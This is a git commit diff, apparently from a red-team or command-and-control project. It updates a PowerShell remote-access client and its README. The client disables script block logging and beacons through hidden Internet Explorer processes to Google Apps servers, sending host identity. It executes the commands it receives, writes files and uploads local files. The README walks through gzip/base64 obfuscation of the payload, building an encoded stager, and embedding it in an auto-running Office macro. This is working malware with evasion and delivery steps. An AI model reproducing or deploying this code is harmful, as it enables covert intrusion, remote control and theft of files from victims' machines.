db490c9e7c8b976bf162bba5d341a20c10348216
Aaron Reyes <gbubba0@gmail.com>
2020-05-30 16:30:24 -0400

    updating powershell client to v1.0 with README

--- client/PowerShell/README.md
+++ client/PowerShell/README.md
@@ -1,27 +1,76 @@
-# NOTE: WORK IN PROGRESS
+## Client Support
 
-### Embed Payload Stager into a Microsoft Document
+![Windows-Tested](https://img.shields.io/static/v1?label=Windows%20%28Tested%29&message=10&color=success&logo=windows&style=flat-square&logoColor=cyan) ![Windows-Untested](https://img.shields.io/static/v1?label=Windows%20%28Untested%29&message=8%2C%207%2C%20Vista%2C%20XP%2c%20Windows%20Server%20%28any%29&color=important&logo=windows&style=flat-square&logoColor=cyan) 
 
-* Use the following powershell stager to run the payload (replace `<SRV>` with the URL of the google web server):
+## Deployment Notes
+
+- Since PowerShell is an interpreted language, `client.ps1` is written to limit payload size. 
+- The client uses the [InternetExplorer COM Interface](https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/aa752084(v%3Dvs.85)) in PowerShell to create hidden InternetExplorer processes that reach out to the Google Apps Servers in the background. 
+- The client disables _<u>process local</u>_ PowerShell script block logging using the technique outlined [here](https://cobbr.io/ScriptBlock-Logging-Bypass.html) first before continuing client execution.
+- Add your Google Apps Server URLs to the `$SRV` array variable in `client.ps1`. The client will cycle through the array to load balance server connections.
+- Run the following PowerShell to generate a payload:
+
+```powershell
+# read in UTF8 encoded file data
+$utf8 = [system.io.file]::readallbytes('client.ps1');
+$text = [system.text.encoding]::utf8.getstring($utf8);
+# compress payload into one line
+$text = $text.replace("  ","").replace("`n","").replace("`r","");
+$bytes = [system.text.encoding]::utf8.getbytes($text);
+# compress unicode payload using gzip
+$buf = new-object system.io.memorystream;
+$gzip = new-object system.io.compression.gzipstream(
+    $buf,
+    [system.io.compression.compressionmode]::compress);
+$gzip.write($bytes, 0, $bytes.length);
+$gzip.close();
+# base64 encode compressed payload
+[system.convert]::tobase64string($buf.toarray());
+$buf.close();
+```
+
+- Copy the above base64 encoded payload and paste it into the following script and replace `<PAYLOAD>`:
+
+```powershell
+$d=[system.convert]::frombase64string("<PAYLOAD>");
+$m=new-object system.io.memorystream;
+$m.write($d,0,$d.length);
+$m.seek(0,0)|out-null;
+$z=new-object system.io.compression.gzipstream($m,[system.io.compression.compressionmode]::decompress);
+$s=new-object system.io.streamreader($z);
+iex($s.readtoend()); 
+```
+
+- Save the previous script with your `<PAYLOAD>` as `stager.ps1` and run the following PowerShell:
+
+```powershell
+# read in UTF8 encoded file data
+$utf8 = [system.io.file]::readallbytes('stager.ps1');
+$text = [system.text.encoding]::utf8.getstring($utf8);
+# compress stager into one line
+$text = $text.replace("`n","").replace("`r","");
+# convert from UTF8 to Unicode (PowerShell.exe needs base64 Unicode)
+$unicode = [system.text.encoding]::convert(
+    [system.text.encoding]::utf8, 
+    [system.text.encoding]::unicode, 
+    [system.text.encoding]::utf8.getbytes($text));
+# output base64 stager
+[system.convert]::tobase64string($unicode);
+```
+
+- Copy the base64 encoded stager and paste it into the following command by replacing `<STAGER>`:
+  - More information about PowerShell obfuscation can be found [here](https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1492186586.pdf)
 
 ```
-$i=new-object -com internetexplorer.application;
-$i.visible=$false;
-$i.silent=$true;
-$i.navigate2('<SRV>',14,0,$null,$null);
-while($i.busy -or ($i.readystate -ne 4)){sleep -seconds 1};
-$p=$i.document.lastchild.innertext;
-$i.quit();
-powershell.exe -v 2 -noE -NonI -nOpR -eNc $p;
+powershell.exe -nOpR -nonI -eNc <STAGER>
 ```
 
-* Use the same compression script for `client.ps1` for this payload to get the base64 encoded stager command
-* Here is an example Microsoft VBS macro used to call the previously mentioned powershell stager:
+- If you are looking for a VBS macro for embedding your payload into a Microsoft Office document, here is one that uses the same `<STAGER>` from the previous steps:
 
-```
+```vbscript
 Private Sub run()
   Dim cmd As String
-  cmd = "wmic process call create 'powershell.exe -nOpR -nonI -eNc <stager>'"
+  cmd = "wmic process call create 'powershell.exe -nOpR -nonI -eNc <STAGER>'"
   Set sh = CreateObject("WScript.Shell")
   res = sh.run(cmd,0,True)
 End Sub
@@ -39,6 +88,16 @@ Sub Auto_Exec()
 End Sub
 ```
 
-* Fun test commands:
-  * `(new-object -com SAPI.SpVoice).speak('self destruct in 9 8 7 6 5 4 3 2 1 boom')`
-  * `$e=new-object -com internetexplorer.application; $e.visible=$true; $e.navigate('https://www.youtube.com/watch?v=dQw4w9WgXcQ');`
+- Here are some fun PowerShell test commands :wink::
+
+```powershell
+(new-object -com SAPI.SpVoice).speak('self destruct in 9 8 7 6 5 4 3 2 1 boom')
+$e=new-object -com internetexplorer.application; 
+$e.visible=$true;
+$e.navigate('https://www.youtube.com/watch?v=dQw4w9WgXcQ');
+```
+
+## TODO:
+
+- [ ] Add better handling of orphaned child `iexplore.exe` processes due to errors in `client.ps1`
+
--- client/PowerShell/client.ps1
+++ client/PowerShell/client.ps1
@@ -1,95 +1,76 @@
-iex('$gp=[ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static");if($gp){$gpc=$gp.GetValue($null);if($gpc["ScriptBlockLogging"]){$gpc["ScriptBlockLogging"]["EnableScriptBlockLogging"]=0;$gpc["ScriptBlockLogging"]["EnableScriptBlockInvocationLogging"]=0;}$val=[System.Collections.Generic.Dictionary[string,System.Object]]::new();$val.Add("EnableScriptBlockLogging",0);$val.Add("EnableScriptBlockInvocationLogging",0);$gpc["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"]=$val;}');
-$CHUNK = 50000;
-$SRV = "https://docs.google.com/spreadsheets/d/1OoUNxbLtZ2sklvwN2qgM3pdh6Rk6708f9ruHzi8QpQ0/edit";
-
-function get {
-  param($ie, $k, $d);
-  $x = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($d));
-  $ie.navigate2($SRV + "?$k=" + $x, 14, 0, $null, $null);
-  while ($ie.busy -or ($ie.readystate -ne 4)) {
-    sleep -seconds 1;
-  };
-  return $ie.document.lastchild.innertext;
+iex('$p=[ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static");if($p){$c=$p.GetValue($null);if($c["ScriptBlockLogging"]){$c["ScriptBlockLogging"]["EnableScriptBlockLogging"]=0;$c["ScriptBlockLogging"]["EnableScriptBlockInvocationLogging"]=0;}$v=[System.Collections.Generic.Dictionary[string,System.Object]]::new();$v.Add("EnableScriptBlockLogging",0);$v.Add("EnableScriptBlockInvocationLogging",0);$c["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"]=$v;}');
+$SRV=@("");
+$X=[system.text.encoding]::UTF8;
+$N=50000;
+$D=10;
+function _g{
+param($s,$d);
+$e=new-object -com internetexplorer.application;
+$e.visible=$false;
+$e.silent=$true;
+$e.navigate2($s+'?'+$d,14,0,$null,$null);
+while($e.busy -or ($e.readystate -ne 4)){sleep -seconds 1}
+$r=$e.document.lastchild.innertext;
+$e.quit();
+return $r;
 }
-
-function post {
-  param($ie, $k, $d, $p);
-  $x = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($d));
-  $ie.navigate2($SRV + "?$k=" + $x, 14, 0, [Text.Encoding]::UTF8.GetBytes("d=$p"), $null);
-  while ($ie.busy -or ($ie.readystate -ne 4)) {
-    sleep -seconds 1;
-  };
+function _p{
+param($s,$d);
+$e=new-object -com internetexplorer.application;
+$e.visible=$false;
+$e.silent=$true;
+$e.navigate2($s,14,0,$X.GetBytes($d),'Content-Type: application/x-www-form-urlencoded');
+while($e.busy -or ($e.readystate -ne 4)){sleep -seconds 1}
+$e.quit();
 }
-
-function _iex {
-  param($private:x);
-  try {
-    return iex $private:x;
-  } catch {
-    return $_;
-  }
+function _x{
+param($private:x);
+try{return ((iex $private:x 2>&1|out-string)+' ')}catch{return [string]$_}
 }
-
-while (1) {
-  try {
-    $ie = new-object -com internetexplorer.application;
-    $ie.visible = $false;
-    $ie.silent = $true;
-    $ip = get-wmiobject Win32_NetworkAdapterConfiguration | where {$_.Ipaddress.length -gt 1};
-    $s = $ip.ipaddress[0] + '|' + $env:USERNAME;
-    while (1) {
-      $b = new-object Collections.ArrayList;
-      while (1) {
-        while (1) {
-          $tp = get $ie 'TxR' $s;
-          if ($tp -ne '0') {
-            break;
-          }
-        }
-        $d = get $ie 'TxD' ($s + '|4');
-        $b.add($d) | out-null;
-        post $ie 'Tx' ($s + '|3') '0';
-        if ($tp -ne '2') {
-          break;
-        }
+while(1){
+  try{
+    $s_i=0;
+    $t0=[system.security.principal.windowsidentity]::GetCurrent().Name;
+    $t1=[system.net.dns]::GetHostName();
+    $t2=get-wmiobject Win32_NetworkAdapterConfiguration|where {$_.Ipaddress.length -gt 1};
+    $u=_g $SRV[$s_i] ('i='+[system.net.webutility]::UrlEncode([system.convert]::ToBase64String($X.GetBytes($t0+'|'+$t1+'|'+$t2.ipaddress[0]))));
+    while(1){
+      $b=new-object Collections.ArrayList;
+      $s_i=($s_i+1)%$SRV.count;
+      while(1){
+        $d=_g $SRV[$s_i] "u=$u";
+        if($d -ne $null){break}
+        sleep -seconds (Get-Random -InputObject @(1..$D));
       }
-      if ($tp -eq '1') {
-        $x = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b -join ''));
-        $r = _iex($x);
-        if ($r -eq $null) {
-          $r = 'NULL';
-        } else {
-          $r = $r | out-string;
-        }
-        $r = $r.ToCharArray();
-      } elseif ($tp -eq '3') {
-        $r = [IO.file]::ReadAllBytes([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b -join '')));
-      } else {
-        [IO.file]::WriteAllBytes("$tp", [Convert]::FromBase64String($b -join ''));
-        $r = 'NULL'.ToCharArray();
+      while(1){
+        $b.add($d)|out-null;
+        $d=_g $SRV[$s_i] "u=$u";
+        if($d -eq $null){break}
       }
-      $i = 0;
-      $rx = [Convert]::ToBase64String($r);
-      while ($i -le ($rx.length - $CHUNK)) {
-        $c = $rx[$i..($i + $CHUNK - 1)] -join '';
-        post $ie 'Rx' ($s + '|4') $c;
-        post $ie 'Rx' ($s + '|3') '2';
-        $i += $CHUNK;
-        while (1) {
-          $tp = get $ie 'RxR' $s;
-          if ($tp -eq '0') {
-            break;
-          }
+      try{
+        if($b[0][0] -eq '0'){
+          $r=[system.convert]::ToBase64String($X.GetBytes((_x($X.GetString([system.convert]::FromBase64String(($b -join '').split('|')[1]))))));
+        }elseif($b[0][0] -eq '1'){
+          $r='ok';
+          [system.io.file]::WriteAllBytes($X.GetString([system.convert]::FromBase64String($b[0].split('|')[1])),[system.convert]::FromBase64String($b[1..($b.count-1)] -join ''));
+        }elseif($b[0][0] -eq '2'){
+          $r=[system.convert]::ToBase64String([system.io.file]::ReadAllBytes($X.GetString([system.convert]::FromBase64String($b[0].split('|')[1]))));
         }
+      }catch{
+        $r=[system.convert]::ToBase64String($X.GetBytes([system.string]$_));
       }
-      $c = $rx[$i..($rx.length + $CHUNK - 1)] -join '';
-      post $ie 'Rx' ($s + '|4') $c;
-      post $ie 'Rx' ($s + '|3') '1';
-      $d = Get-Random -InputObject 1, 2, 3;
-      sleep -seconds $d;
-      $ie.stop();
+      $i=0;
+      while ($i -le ($r.length - $N)) {
+        $c=$r[$i..($i + $N - 1)] -join '';
+        _p $SRV[$s_i] ("u=$u&d="+[system.net.webutility]::UrlEncode($c));
+        $i+=$N;
+      }
+      $c=$r[$i..($r.length+$N-1)] -join '';
+      _p $SRV[$s_i] ("u=$u&d="+[system.net.webutility]::UrlEncode($c));
+      _p $SRV[$s_i] ("u=$u&d=");
     }
-  } catch {
-    taskkill.exe /f /im iexplore.exe;
+  }
+  catch {
+    write-host $_;
   }
 }
